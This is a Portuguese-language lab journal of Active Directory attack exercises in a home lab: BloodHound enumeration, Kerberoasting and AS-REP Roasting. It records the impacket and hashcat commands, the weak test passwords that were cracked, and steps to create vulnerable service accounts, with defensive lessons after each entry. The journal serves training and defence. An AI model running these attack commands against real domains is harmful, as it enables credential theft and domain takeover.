**Gravidade e impacto real (num cenário empresarial):** A informação exposta aqui por definição de protocolo (nome do domínio, hostname do DC, nível funcional, versão do Windows Server, estado do SMB signing) tem, isolada, impacto baixo — não dá acesso direto a nada. O valor real está noutro sítio: é a matéria-prima de reconhecimento que alimenta ataques posteriores mais sérios (como o Kerberoasting da Sessão 6.3). Numa empresa real, isto é tipicamente o primeiro passo de um atacante externo antes de decidir por onde tentar entrar — o contrafactual interessante é que, se algum dos quatro pontos verificados (bind anónimo, `RestrictAnonymous`, transferência de zona, SMB signing) estivesse mal configurado, o "custo de entrada" para o atacante desceria drasticamente, sem sequer precisar de uma credencial válida.

**Domínios relacionados:** CEH D2 (Reconhecimento e Scanning), Security+ D4 (avaliação de vulnerabilidades), MITRE ATT&CK (T1087 — Account Discovery; T1018 — Remote System Discovery)

**Próximos passos:** Avançar para a Sessão 6.2 (Enumeração autenticada + BloodHound, com a conta `uteste` já existente).

**English summary:** Enumerated the Active Directory domain from Kali with zero valid credentials, simulating an external attacker's view. Confirmed what Windows Server exposes by protocol design (LDAP RootDSE, hostname, OS version) versus what is correctly locked down (anonymous LDAP bind, SMB share listing, RID cycling, DNS zone transfer). No exploitable misconfiguration found — a clean, realistic result that sets up the reconnaissance groundwork for later attacks such as Kerberoasting.

---

## Entrada #90 — Sessão 6.2: Enumeração autenticada com BloodHound — infraestrutura Docker, recolha de dados e pathfinding

**Máquinas ligadas:** Kali Linux (Atacante, `192.168.10.10`), Windows Server (Controlador de Domínio, `192.168.10.1`), OPNsense (`192.168.10.254`, ligado para garantir acesso à internet)

**Objetivo:** Continuar a Fase 6 com uma vista de enumeração autenticada do Active Directory — usando a conta de baixo privilégio `uteste` e a ferramenta BloodHound (Community Edition) para visualizar graficamente possíveis caminhos de escalada de privilégio até Domain Admin, complementando a vista "sem credenciais" da Sessão 6.1.

**Alternativas consideradas:**
- Instalação do BloodHound CE via Docker Compose (arquitetura oficial: PostgreSQL + Neo4j + API/interface web), em vez de montar os componentes manualmente — mais fiel ao processo real recomendado pela SpecterOps.
- Escolha do collector `bloodhound-python` em vez do SharpHound — permite recolher dados diretamente a partir do Kali, coerente com a posição do "atacante" nesta sessão (tem credenciais válidas mas ainda não tem execução de código numa máquina Windows do domínio), evitando também deixar artefactos num endpoint monitorizado pelo Sysmon/Wazuh.
- Mantida a decisão de continuar a usar `sudo` em cada comando Docker em vez de adicionar o utilizador ao grupo `docker` — coerente com a preferência por uma abordagem didática/manual, mesmo custando mais fricção (como se veio a confirmar, com o plugin do Compose instalado só na pasta pessoal do utilizador, não na do `root`).
- Nova política adotada a partir desta sessão: manter o OPNsense sempre ligado por defeito em todas as sessões futuras da Fase 6, já que a maioria dos exercícios (instalação de ferramentas, collectors, wordlists) provavelmente vai precisar de acesso à internet em algum momento — mais simples e realista do que decidir caso a caso, evitando o tempo perdido a diagnosticar falhas de rede que eram apenas o OPNsense desligado (como aconteceu nesta própria sessão, ao tentar instalar o `docker.io`).

**Ação executada:**
1. Instalação do motor Docker (`docker.io`) no Kali, com o serviço confirmado ativo via `systemctl status docker`.
2. Download do `docker-compose.yml` oficial do BloodHound CE (SpecterOps) e revisão conjunta dos três serviços definidos (`app-db`/PostgreSQL, `graph-db`/Neo4j, `bloodhound`), confirmando que todas as portas ficam por defeito amarradas a `127.0.0.1` — acesso só a partir do próprio Kali, consistente com o acesso via consola gráfica local usado neste lab.
3. Falha ao correr `sudo docker compose up -d` — o `docker.io` do Kali não inclui o plugin `docker compose` (v2), e o pacote `docker-compose-plugin` não está disponível nos repositórios do Kali via `apt`.
4. Instalação manual do plugin `docker compose` como binário em `~/.docker/cli-plugins/`, descarregado diretamente do repositório oficial do GitHub (Docker Compose v5.5.0).
5. Segunda falha, mesmo erro, ao correr o comando com `sudo` — diagnosticado como um problema de `$HOME`: o plugin instalado na pasta pessoal do utilizador `pedro` não é visível quando o comando corre como `root` via `sudo` (que procura em `/root/.docker/cli-plugins/`). Resolvido copiando o mesmo binário também para essa pasta.
6. `sudo docker compose up -d` executado com sucesso — três contentores criados e saudáveis (Neo4j, PostgreSQL, BloodHound), com download automático das respetivas imagens.
7. Password inicial de administrador do BloodHound CE obtida nos logs do contentor (`docker compose logs bloodhound | grep -A1 "Initial Password Set To"`), login feito na interface web (`http://127.0.0.1:8080`) com o utilizador `admin` (não é um email real, apesar do campo se chamar "Email Address").
8. Antes da recolha de dados, foi necessário redefinir a password da conta `uteste` a partir do Windows Server (`Set-ADAccountPassword -Reset`), porque a password original — definida há várias sessões atrás e nunca registada em texto simples no registo, por boas práticas de segurança — tinha sido esquecida. O reset teve o efeito colateral de desbloquear a conta, que tinha ficado bloqueada num teste de política de bloqueio da Fase 5 (confirmado com `Get-ADUser -Properties PasswordLastSet, LockedOut, Enabled`).
9. Recolha de dados com `bloodhound-python -u uteste -p '<password>' -d lab.local -ns 192.168.10.1 -c All --zip` — concluída em 9 segundos: 2 computadores, 5 utilizadores, 52 grupos, 3 GPOs, 5 OUs, 19 contentores, 0 trusts. Aviso de falha na obtenção do TGT Kerberos (falha na resolução de nome), com recuo automático bem-sucedido para autenticação NTLM.
10. Upload do ficheiro `.zip` gerado para a interface web do BloodHound CE (via seletor de ficheiros — o drag-and-drop não funcionou), confirmado com sucesso ao pesquisar o nó `UTESTE@LAB.LOCAL` e ver os seus detalhes reais, incluindo o carimbo `Last Collected by BloodHound`.
11. Teste de Pathfinding entre `UTESTE@LAB.LOCAL` (origem) e `DOMAIN ADMINS@LAB.LOCAL` (destino) — resultado: **"Path not found."**, confirmado como resultado real (não falha de interface) por não haver mensagem de erro e por o grupo `Domain Admins` ser reconhecido corretamente pela pesquisa (ícone próprio de grupo de alto privilégio).

**Resultado:** Infraestrutura BloodHound CE totalmente operacional no Kali (Docker + Compose + três contentores), dados do domínio `lab.local` recolhidos com sucesso via `bloodhound-python` com a conta de baixo privilégio `uteste`, e confirmação de que não existe nenhum caminho de escalada de privilégio (direto ou indireto) dessa conta até ao grupo Domain Admins. Um segundo resultado honesto e "limpo", coerente com a Sessão 6.1 — reforça que este é um domínio pequeno, criado de raiz, sem as acumulações de permissões excessivas típicas de ambientes reais mais antigos.

**Deduções e raciocínio:** A dificuldade técnica principal desta sessão não esteve na parte de segurança/AD, mas na infraestrutura de suporte (Docker/Compose) — um bom lembrete de que grande parte do trabalho real em cibersegurança é "engenharia de sistemas" antes de ser "hacking": instalar, configurar e depurar ferramentas. O problema do plugin do Compose só visível para o utilizador `pedro` e não para o `root` foi um exercício prático concreto sobre como o Linux resolve `$HOME` por utilizador, e uma implicação direta da escolha consciente de continuar a usar `sudo` em vez de entrar no grupo `docker` (mais fricção, mas mais transparência sobre o que está a acontecer a cada passo).

Ficou também clarificado, com alguma confusão pelo meio que valeu a pena desfazer com calma, que existem três passwords distintas e sem relação entre si neste exercício: a password de administrador de domínio usada para entrar no Windows Server, a password de administrador da própria aplicação BloodHound CE (gerada automaticamente pelo Docker), e a password da conta de domínio `uteste` (usada pelo collector para se autenticar). Confundi-las é fácil quando se trabalha com várias camadas de autenticação ao mesmo tempo — mas distingui-las corretamente é uma competência central deste tipo de trabalho, não um detalhe menor.

Por fim, "Path not found" é um resultado tão válido e informativo como encontrar um caminho — o BloodHound não serve só para mostrar problemas, serve também para comprovar, com evidência concreta, que uma configuração está correta.

**Consigo explicar isto a alguém?** Sim — com a ressalva de que ainda estou a consolidar a arquitetura completa do BloodHound (o papel do Neo4j como base de grafos, a diferença entre um collector e a aplicação em si), mas os passos individuais e o significado do resultado final, sim.

**Como nos podemos defender / lição operacional:** Este exercício mostra o valor do BloodHound como ferramenta de auditoria defensiva, não só ofensiva: correr periodicamente um collector com uma conta de baixo privilégio real e verificar que não existe caminho até Domain Admin é uma forma concreta de validar que a estrutura de grupos e permissões do domínio não degradou ao longo do tempo — o que acontece facilmente em ambientes reais, à medida que se vão acumulando permissões pontuais "temporárias" que nunca são revertidas.

**Gravidade e impacto real (num cenário empresarial):** O contrafactual aqui é direto: se existisse um caminho até Domain Admin a partir de uma conta comum como a `uteste`, seria compromisso total do domínio — acesso a todos os dados, capacidade de criar contas de administrador, desativar defesas, implantar ransomware em massa. É o pior cenário possível para qualquer organização. O valor de correr esta auditoria preventivamente, como fizemos, é precisamente evitar ser a própria empresa a descobrir isto da pior forma — através de um atacante real ou de um pentest pago — em vez de o veres tu próprio antes, com tempo para corrigir sem pressão.

**Domínios relacionados:** CEH D3/D5 (Escalada de Privilégios, Pós-Exploração), Security+ D3 (arquitetura, princípio do menor privilégio), MITRE ATT&CK (T1087 — Account Discovery; T1069 — Permission Groups Discovery; T1482 — Domain Trust Discovery)

**Próximos passos:** Sessão 6.3 — Kerberoasting.

**English summary:** Stood up BloodHound Community Edition via Docker Compose on Kali, collected Active Directory data with the low-privilege `uteste` account using `bloodhound-python`, and ran a pathfinding query from that account to Domain Admins. Result: "Path not found" — confirming there is no privilege-escalation path in this domain, a genuinely useful defensive finding, not just an offensive dead end. Most of the real friction was infrastructure (a Docker Compose plugin visible to the `pedro` user but not to `root`), a reminder that a lot of real security work is systems engineering first.

---

## Entrada #91 — Sessão 6.3: Kerberoasting — da criação da conta de serviço à password quebrada offline

**Máquinas ligadas:** Kali Linux (Atacante, `192.168.10.10`), Windows Server (Controlador de Domínio, `192.168.10.1`), OPNsense (`192.168.10.254`, ligado por defeito — política adotada na Sessão 6.2)

**Objetivo:** Executar o ataque de Kerberoasting: pedir um Ticket de Serviço (TGS) para uma conta com SPN (Service Principal Name) usando uma conta de domínio de baixo privilégio, extrair o hash do ticket e tentar quebrá-lo offline com `hashcat`, demonstrando por que passwords de contas de serviço têm de ser fortes e rotativas.

**Alternativas consideradas:**
- Verificado antecipadamente que o domínio `lab.local` não tinha nenhuma conta de serviço com SPN configurado — decidido criar uma de propósito (`svc_sql`), documentando isso com honestidade, tal como já foi feito noutras fases do lab quando um alvo teve de ser preparado deliberadamente.
- Escolha do nome da conta e do SPN (`svc_sql`, `MSSQLSvc/sql01.lab.local:1433`) a simular um cenário comum em ambientes reais — uma conta criada para um SQL Server legado, sem que o serviço precise de estar de facto a correr (o Kerberoasting só depende do SPN estar registado, não da existência real do serviço).
- `PasswordNeverExpires $true` na conta de serviço — não é só conveniência para o exercício, é também realista: contas de serviço reais são frequentemente configuradas assim para não partir aplicações quando a password "expira" sem ninguém a atualizar, o que é precisamente a razão pela qual acumulam passwords antigas e fracas ao longo dos anos.
- Duas tentativas de password para a `svc_sql`, deliberadamente diferentes: primeiro `Summer2026!` (padrão previsível "palavra + ano + símbolo", mas não presente na wordlist usada), depois `Password123` (um dos padrões mais reutilizados e presentes em fugas de dados reais) — para mostrar, por contraste, que "parecer fraca" e "estar numa wordlist específica" não são a mesma coisa.

**Ação executada:**
1. Conta de serviço `svc_sql` criada no Windows Server (`New-ADUser`), com SPN `MSSQLSvc/sql01.lab.local:1433` associado via `Set-ADUser -ServicePrincipalNames`, confirmada com `Get-ADUser -Properties ServicePrincipalNames, PasswordNeverExpires`.
2. Password da conta `uteste` redefinida novamente a partir do Windows Server (mesmo procedimento da Sessão 6.2, já que a password não fica guardada no registo) — usada para o pedido do ticket.
3. Pedido do Ticket de Serviço a partir do Kali com `impacket-GetUserSPNs -request -dc-ip 192.168.10.1 'lab.local/uteste:<password>' -outputfile kerberoast_hash.txt`, usando a conta de baixo privilégio `uteste` — sem qualquer privilégio especial, confirmando que este pedido é permitido por definição do protocolo Kerberos, não uma falha de configuração. Resultado listou a conta `svc_sql`, o SPN, `PasswordLastSet` e `LastLogon: <never>` — outro sinal de conta de serviço esquecida.
4. Hash extraído (`$krb5tgs$23$...`, tipo de cifra RC4-HMAC) confirmado como uma única entrada lógica no ficheiro (`wc -l` a devolver 1), apesar de aparecer em várias linhas visuais no terminal por ser muito comprido.
5. Primeira tentativa de quebra offline: `hashcat -m 13100 kerberoast_hash.txt /usr/share/wordlists/rockyou.txt` (14.344.392 passwords, dicionário `rockyou.txt` descomprimido com `gunzip` a partir do `.gz` original) contra a password `Summer2026!` — dicionário esgotado (`Status: Exhausted`) sem sucesso (`Recovered: 0/1`), confirmando que um ataque de dicionário puro só encontra correspondências exatas com o que está escrito na wordlist.
6. Password da `svc_sql` redefinida para `Password123` (cumpre a política de complexidade do domínio — maiúscula, minúscula, número — e é altamente comum em fugas de dados reais), novo pedido de ticket e novo `hashcat` — desta vez **quebrada com sucesso** (`Status: Cracked`, `Recovered: 1/1`), encontrada a 0,24% da wordlist percorrida, em menos de um segundo.

**Resultado:** Ciclo completo do Kerberoasting demonstrado de ponta a ponta: uma conta de domínio comum, sem qualquer privilégio, pediu um ticket de serviço para uma conta de alto valor (SQL) e, através de uma password de serviço fraca, recuperou-a offline em segundos — sem gerar uma única tentativa de login falhada contra o domínio, e por isso sem risco de acionar a política de bloqueio de conta configurada na Fase 5.

**Deduções e raciocínio:** A distinção mais importante desta sessão está no contraste entre as duas tentativas: a primeira password (`Summer2026!`) seguia um padrão "previsível" mas não foi encontrada, porque um ataque de dicionário puro não adivinha, só compara com o que já está escrito na lista — a `rockyou.txt` é uma fuga de dados de 2009 e não pode conter literalmente uma string com "2026". A segunda (`Password123`) foi encontrada quase instantaneamente por ser genuinamente comum em fugas reais. Isto ensina que "parece uma password fraca" e "vai ser quebrada por esta ferramenta com esta wordlist" são afirmações relacionadas mas distintas — o que importa de facto é se a password está (ou é próxima de estar, com regras de mutação) no material que o atacante usa para testar.

A outra lição central é sobre o próprio mecanismo: qualquer conta autenticada do domínio pode pedir um TGS para qualquer conta com SPN — isto não é uma falha, é o funcionamento normal e por design do Kerberos. A vulnerabilidade nunca está em conseguir pedir o ticket; está inteiramente na força da password que o cifra. E por o processo de quebra acontecer offline, depois do pedido inicial, o ataque não deixa rasto de tentativas de login falhadas — a política de bloqueio de conta da Fase 5, eficaz contra força bruta direta, é completamente inútil aqui.

**Consigo explicar isto a alguém?** Sim.

**Como nos podemos defender / lição operacional:** Passwords longas e aleatórias para contas de serviço (idealmente geridas por um cofre de segredos, não memorizadas por uma pessoa); contas de serviço geridas (`gMSA`), que rodam a password automaticamente e tornam este ataque impraticável; remover SPNs de contas que já não sejam precisas; monitorizar pedidos anómalos de TGS (Event ID 4769, especialmente com cifra RC4/etype 23 num domínio que já deveria ter migrado para AES); e, mais avançado, desativar RC4 e forçar só AES nas contas Kerberos — não impede o ataque, mas torna a quebra muito mais lenta.

**Gravidade e impacto real (num cenário empresarial):** Depende diretamente dos privilégios reais da conta de serviço comprometida — é aí que o dano mais varia. No pior caso realista, uma conta de serviço esquecida como esta foi criada há anos com privilégios excessivos (por exemplo, Domain Admin, para "simplificar" a instalação de um sistema legado) — nesse cenário, comprometê-la equivale a comprometer o domínio inteiro. No caso mais contido, como o nosso (`svc_sql` sem privilégios elevados), o dano fica limitado ao que essa conta especificamente consegue aceder — ainda assim, por exemplo, uma base de dados com informação de clientes, uma fuga de dados séria por si só.

A capacidade de absorver o impacto também difere muito com a dimensão da organização. Uma empresa grande tende a ter camadas adicionais de defesa (segmentação de rede, deteção comportamental, equipa de resposta a incidentes dedicada) capazes de conter o ataque antes de escalar — mas também tem mais dados e sistemas em jogo, pelo que o impacto financeiro absoluto de uma fuga bem-sucedida tende a ser maior, muitas vezes sujeito a obrigações regulatórias pesadas (ex.: RGPD, com contraordenações associadas). Uma pequena/média empresa tem tipicamente muito menos exposto, mas quase nenhuma dessas camadas de defesa — muitas vezes um único administrador de sistemas, sem monitorização dedicada — pelo que um ataque tecnicamente modesto pode ser desproporcionalmente mais difícil de detetar e recuperar, ao ponto de ameaçar a continuidade do próprio negócio.

**Domínios relacionados:** CEH D3 (System Hacking), Security+ D2 (Ameaças e Vulnerabilidades), MITRE ATT&CK (T1558.003 — Kerberoasting)

**Próximos passos:** Sessão 6.4 — AS-REP Roasting.

**English summary:** Performed a full Kerberoasting attack: created a deliberately vulnerable service account (`svc_sql`) with an SPN, requested its service ticket as the unprivileged `uteste` account (impacket's GetUserSPNs), and cracked the extracted hash offline with hashcat. A dictionary attack with `Summer2026!` failed against rockyou.txt, but `Password123` cracked in under a second — illustrating that Kerberoasting generates zero failed-login events, making the Phase 5 account-lockout policy completely blind to it, and that real defense here means strong, rotated service-account passwords (ideally gMSA), not lockout policies.

---

## Entrada #92 — Sessão 6.4: AS-REP Roasting — password recuperada sem qualquer credencial válida

**Máquinas ligadas:** Kali Linux (Atacante, `192.168.10.10`), Windows Server (Controlador de Domínio, `192.168.10.1`), OPNsense (`192.168.10.254`)

**Objetivo:** Executar o ataque de AS-REP Roasting — pedir a resposta inicial de autenticação Kerberos (AS-REP) para uma conta com a pré-autenticação desativada, sem usar qualquer credencial de domínio, extrair o hash e tentar quebrá-lo offline. Fechar antes a pendência da Entrada #87 sobre o Windows Update do Windows Server.

**Alternativas consideradas:**
- Windows Update: diagnosticada e corrigida a causa raiz (faltava a porta 80/HTTP nas regras de saída, usada na validação de certificados CRL/OCSP; só a 443 estava aberta). Decidido não instalar as atualizações de imediato — pediriam reinício, e reiniciar o Controlador de Domínio a meio da sessão interromperia o exercício — só confirmar a causa raiz resolvida.
- Em vez de reaproveitar a `svc_sql`, criada uma conta nova (`svc_legacy`), com uma narrativa distinta: uma aplicação antiga cuja pré-autenticação foi desativada por compatibilidade com um cliente Kerberos mais velho — um dos motivos reais por que esta definição aparece ativa em ambientes empresariais antigos.
- Pedido o AS-REP testando uma lista de quatro nomes (`Administrator`, `uteste`, `svc_sql`, `svc_legacy`) em vez de visar só a `svc_legacy` diretamente — mais fiel ao processo real de um atacante, que normalmente não sabe à partida qual conta (se alguma) está vulnerável.
- Repetida a estrutura pedagógica da Sessão 6.3: uma primeira password no padrão "palavra+ano+símbolo" (`Welcome2026!`), depois uma segunda genuinamente comum (`Welcome123`) — a mesma lição, com um cenário diferente.

**Ação executada:**
1. Corrigida a regra de egress filtering do OPNsense (porta 80 adicionada); confirmado com `Get-WindowsUpdate` que o Windows Update do Windows Server voltou a listar atualizações.
2. Confirmado com `Get-ADUser -Filter * -Properties DoesNotRequirePreAuth` que nenhuma conta do domínio tinha a pré-autenticação desativada por defeito.
3. Criada a conta `svc_legacy` (`New-ADUser`, password inicial `Welcome2026!`), com `DoesNotRequirePreAuth` ativado via `Set-ADAccountControl`.
4. A partir do Kali, pedido o AS-REP para os quatro nomes de utilizador com `impacket-GetNPUsers lab.local/ -usersfile usernames.txt -no-pass -dc-ip 192.168.10.1 -format hashcat -outputfile asrep_hash.txt`, sem qualquer credencial. As três contas normais devolveram "doesn't have UF_DONT_REQUIRE_PREAUTH set"; só a `svc_legacy` devolveu um hash (`$krb5asrep$23$...`, RC4-HMAC).
5. Primeira quebra offline (`hashcat -m 18200`) contra `Welcome2026!` — dicionário esgotado, sem sucesso.
6. Password redefinida para `Welcome123`, novo pedido de AS-REP e novo `hashcat` — **quebrada com sucesso**, a 1,33% da wordlist, em ~2 segundos.

**Resultado:** Ciclo completo do AS-REP Roasting demonstrado de ponta a ponta: uma conta vulnerável foi identificada e explorada sem qualquer credencial de domínio — nem sequer a `uteste` foi necessária, ao contrário da Kerberoasting.

**Deduções e raciocínio:** A diferença central face à Sessão 6.3 é a barreira de entrada: Kerberoasting exigia pelo menos uma conta válida para pedir o TGS; o AS-REP Roasting não exige nada, só o nome de uma conta candidata — daí testar uma lista, tal como um atacante real faria com nomes obtidos por reconhecimento (Sessão 6.1). Em teoria é a variante mais perigosa das duas, mas depende de uma pré-condição que não vem ativa por defeito. Repete-se também a lição da 6.3: "parecer fraca" ≠ "estar na wordlist".

**Consigo explicar isto a alguém?** Sim.

**Como nos podemos defender / lição operacional:** Auditar periodicamente o domínio com `Get-ADUser -Filter * -Properties DoesNotRequirePreAuth` — é uma definição que raramente deveria estar ativa. Onde for mesmo necessária (sistemas legados), compensar com password longa/aleatória em cofre de segredos. Monitorizar Event ID 4768 sem pré-autenticação correspondente.

**Gravidade e impacto real (num cenário empresarial):** Em teoria, mais perigosa que o Kerberoasting — não exige nenhuma credencial válida, só uma lista de nomes de utilizador prováveis (fácil de obter: convenções de nome, LinkedIn, fugas anteriores). Um atacante totalmente externo pode tentar isto sem nunca ter feito login. Na prática, em domínios bem geridos tende a não haver nenhuma conta assim (como confirmámos aqui); mas em ambientes com migrações mal documentadas, uma única conta esquecida nestas condições já dá a um atacante um primeiro pé dentro do domínio, de forma totalmente silenciosa.

**Domínios relacionados:** CEH D3 (System Hacking), Security+ D2 (Ameaças e Vulnerabilidades), MITRE ATT&CK (T1558.004 — AS-REP Roasting)

**Próximos passos:** Sessão 6.5 — Ponto de situação: o que o Wazuh viu (e o que não viu).

**English summary:** Performed an AS-REP Roasting attack — Kerberoasting's "no credentials needed at all" sibling. Created a deliberately vulnerable account with Kerberos pre-authentication disabled, then requested its AS-REP response from Kali using only a candidate username list, no domain credentials whatsoever. All normal accounts correctly required pre-authentication; only the vulnerable one leaked a crackable hash. A `Welcome2026!`-style password again survived rockyou.txt, while `Welcome123` cracked in seconds — confirming this is, in principle, the more dangerous of the two attacks, since it needs no foothold in the domain at all.

---

## Entrada #93 — Sessão 6.5: Ponto de situação — o que o Wazuh viu (e o que não viu) nas Sessões 6.1-6.4

**Máquinas ligadas:** VM Wazuh (`192.168.10.30`), Windows Server (Controlador de Domínio), Windows 11, Ubuntu Desktop, Kali Linux (browser)

**Objetivo:** Sessão dedicada, sem ataque novo — rever o Wazuh Dashboard depois das Sessões 6.1 a 6.4 (enumeração do AD, BloodHound, Kerberoasting, AS-REP Roasting), perceber que lacunas de deteção existem por defeito (à semelhança do que já aconteceu com o FTP na Entrada #86) e decidir se vale a pena adicionar regras Wazuh específicas para os ataques ao Active Directory.

**Ação executada (sessão em curso):**
1. Confirmado o acesso ao Wazuh Dashboard (`https://192.168.10.30`) — stack ligado e a responder, ecrã "Overview" acessível.
2. Antes de analisar qualquer alerta específico das Sessões 6.1-6.4, identificado um problema prévio no widget "Agents Summary": **apenas 1 agente em estado Active, os outros 3 em Disconnected**, de um total de 4 agentes esperados (Servidor Vulnerável, Windows Server, Windows 11, Ubuntu Desktop — o Kali fica sempre de fora, é o atacante).

3. Lista completa de agentes verificada: **`003` windows-server (`192.168.10.1`) — Active**; os 3 Disconnected são `001` servidor-vulneravel (`192.168.10.101`), `002` ubuntu-wg (`192.168.10.20`) e `004` windows11 (`192.168.10.100`).
4. Causa confirmada: as 3 VMs desconectadas estão simplesmente desligadas no VMware Workstation neste momento (só Kali, Windows Server, OPNsense e Wazuh estavam ligadas para esta sessão) — não é falha de configuração nem lacuna de deteção real, e não afeta a análise seguinte, já que nenhuma das três foi alvo direto das Sessões 6.1-6.4.

**Resultado (parcial):** O agente que interessa para esta análise — `windows-server` (o Controlador de Domínio, alvo de todos os ataques Kerberos das Sessões 6.1-6.4) — está Active. A desconexão dos outros três agentes é benigna (VMs simplesmente não ligadas hoje), não uma pendência técnica.

5. Aberto o módulo **"Threat Hunting" → Dashboard**, intervalo "Last 5 days" (cobre 30/08 a 04/09), ainda sem filtro por agente (só `manager.name: wazuh`, ou seja, agregado de todos os agentes). Números observados: **18 328 eventos totais**, **146 alertas de nível 12 ou superior**, **3 falhas de autenticação**, **7 944 autenticações com sucesso**. No gráfico "Top 10 MITRE ATT&CKs", a fatia esmagadoramente dominante é **"Valid Accounts"**, seguida (muito menores) de Lateral Tool Transfer, Ingress Tool Transfer, Modify Registry, Command and Scripting, Stored Data Manipulation, PowerShell, File Deletion, Windows Command Shell e Windows Service.
6. Nota provisória: nenhuma técnica claramente associada a Kerberoasting/AS-REP Roasting (ex. T1558) aparece destacada neste Top 10 agregado — mas ainda é preciso filtrar por agente `windows-server` e pelo período exato de cada sessão antes de tirar qualquer conclusão sobre deteção (ou ausência dela).

**Próximos passos (dentro desta sessão):** Filtrar por `agent.name: windows-server` e comparar os totais antes/depois; depois cruzar com as janelas temporais exatas de cada sessão (6.1 a 6.4) para perceber o que foi (ou não foi) detetado especificamente em cada ataque.

---


## Screenshots
### 2026-08-31

- `screenshots/2026-08-31/entrada90-bloodhound-uteste-node-confirmado.png` — BloodHound CE, nó `UTESTE@LAB.LOCAL` com o painel Object Information completo, confirmando a ingestão bem-sucedida dos dados recolhidos pelo `bloodhound-python` (Entrada #90)
- `screenshots/2026-08-31/entrada90-bloodhound-pathfinding-path-not-found.png` — BloodHound CE, Pathfinding entre `UTESTE@LAB.LOCAL` e `DOMAIN ADMINS@LAB.LOCAL`, resultado "Path not found." (Entrada #90)

### 2026-08-30

- `screenshots/2026-08-30/entrada87-opnsense-regras-windows-update-aplicadas.png` — OPNsense, regras LAN com as exceções de egress filtering (TCP 443) para Windows Update do Windows Server e Windows 11 já posicionadas corretamente (Entrada #87)
- `screenshots/2026-08-30/entrada87-calc-exe-teste-relogio-errado.png` — terminal + Calculadora no Windows Server durante o teste de deteção, relógio a mostrar 03:20 (fuso horário ainda errado, causa raiz da descoberta principal) (Entrada #87)
- `screenshots/2026-08-30/entrada87-dashboard-calc-sem-resultados.png` — Wazuh Dashboard, pesquisa "calc" sem resultados devido ao desfasamento de relógio (Entrada #87)
- `screenshots/2026-08-30/entrada87-eventos-reais-powershell-secedit-discovery.png` — Wazuh Dashboard, Events com 45 hits reais (PowerShell, SecEdit, Discovery, File Deletion), prova do pipeline Sysmon → alerta de ponta a ponta (Entrada #87)
- `screenshots/2026-08-30/entrada87-dashboard-mitre-attack-deteccoes.png` — Wazuh Dashboard, vista agregada com o gráfico MITRE ATT&CK das deteções reais (Entrada #87)
- `screenshots/2026-08-30/entrada88-alerta-nivel15-mitre-t1105.png` — Wazuh Dashboard, alerta de nível 15 "Executable file dropped in folder commonly used by malware" (regra 92213, MITRE T1105) (Entrada #88)
- `screenshots/2026-08-30/entrada88-alerta-detalhe-psscriptpolicytest.png` — detalhe do evento, targetFilename `__PSScriptPolicyTest_*.ps1`, confirmando o falso positivo (Entrada #88)
- `screenshots/2026-08-30/entrada88-eventos-windows11-209-hits-pipeline.png` — Wazuh Dashboard, Events do agente windows11 com 209 hits, pipeline Sysmon confirmado de ponta a ponta (Entrada #88)

### 2026-08-25

- `screenshots/2026-08-25/entrada75-ids-settings-configuracao-inicial.png` — OPNsense, IDS Settings com a configuração inicial (Enabled, Interfaces=LAN) (Entrada #75)
- `screenshots/2026-08-25/entrada75-secure-shell-root-password-desativados.png` — Administration: Secure Shell, root login e password login desativados (causa raiz da falha SSH) (Entrada #75)
- `screenshots/2026-08-25/entrada75-ssh-login-sucesso.png` — terminal SSH com login bem-sucedido após a correção (Entrada #75)
- `screenshots/2026-08-25/entrada76-rulesets-download-nao-instalado.png` — Rulesets Download, todos os rulesets em "not installed" (causa raiz do IDS sem regras) (Entrada #76)
- `screenshots/2026-08-25/entrada76-regras-ficheiro-vazio-placeholder.png` — cat ao ficheiro OPNsense.rules, placeholder vazio gerado automaticamente (Entrada #76)
- `screenshots/2026-08-25/entrada76-fetch-erro-typo-gaz.png` — shell, comando fetch com erro de typo (.gaz em vez de .gz) (Entrada #76)
- `screenshots/2026-08-25/entrada76-fetch-sucesso-download-regras.png` — shell, fetch bem-sucedido do emerging.rules.tar.gz (5458 kB) (Entrada #76)
- `screenshots/2026-08-25/entrada76-log-avisos-sem-regras-carregadas.png` — Log File do IDS com avisos "1 rule files specified, but no rules were loaded!" (Entrada #76)
- `screenshots/2026-08-25/entrada76-configctl-ids-update-sucesso.png` — shell, configctl ids update com sucesso e rules.sqlite gerado (Entrada #76)
- `screenshots/2026-08-25/entrada76-rules-tab-1160-entradas.png` — Rules tab do IDS a mostrar 1160 entradas carregadas (Entrada #76)
- `screenshots/2026-08-25/entrada77-alerts-deteccao-real-confirmada.png` — página Alerts com deteção IDS real (192.168.10.102 → 192.168.10.254:80) (Entrada #77)
- `screenshots/2026-08-25/entrada79-dhcp-leases-antes-reserva-windows11.png` — DHCP Leases, Windows 11 (192.168.10.100) ainda como dynamic, antes da reserva estática (Entrada #79)
- `screenshots/2026-08-25/entrada79-dhcp-mapeamento-estatico-windows11-formulario.png` — formulário de mapeamento estático DHCP para o Windows 11, MAC/hostname pré-preenchidos (Entrada #79)
- `screenshots/2026-08-25/entrada79-dhcp-mapeamento-estatico-guardado.png` — confirmação de gravação do mapeamento estático do Windows 11, a aguardar "Apply changes" (Entrada #79)
- `screenshots/2026-08-25/entrada80-regra-windows-server-nao-ordenada-fundo-lista.png` — regra Pass do Windows Server recém-criada, no fundo da lista, ainda antes de ser reordenada (Entrada #80)
- `screenshots/2026-08-25/entrada80-regras-windows-server-reordenadas-pendente-apply.png` — regras Pass+Block do Windows Server já reordenadas corretamente, a aguardar "Apply changes" (Entrada #80)
- `screenshots/2026-08-25/entrada80-regras-windows11-posicionadas-pendente-apply.png` — regras Pass+Block do Windows 11 corretamente posicionadas (Entrada #80)
- `screenshots/2026-08-25/entrada80-regras-windows11-aplicadas-sucesso.png` — regras do Windows 11 aplicadas com sucesso ("The changes have been applied successfully") (Entrada #80)
- `screenshots/2026-08-25/entrada80-regras-ubuntu-desktop-posicionadas.png` — regras Pass+Block do Ubuntu Desktop corretamente posicionadas, lista completa das 4 VMs (Entrada #80)

### 2026-08-24

- `screenshots/2026-08-24/entrada70-gpo-aviso-login-texto.png` — GPMC, texto do aviso de login definido (Entrada #70)
- `screenshots/2026-08-24/entrada70-gpo-aviso-login-titulo.png` — GPMC, título do aviso de login definido (Entrada #70)
- `screenshots/2026-08-24/entrada71-ipconfig-dns-incorreto-antes.png` — Windows 11, ipconfig /all com DNS incorreto antes da correção (Entrada #71)
- `screenshots/2026-08-24/entrada71-dns-corrigido-resolve-dnsname.png` — DNS corrigido, Resolve-DnsName lab.local com sucesso (Entrada #71)
- `screenshots/2026-08-24/entrada71-erro-addcomputer-shell-errada.png` — erro Add-Computer corrido na shell errada (Entrada #71)
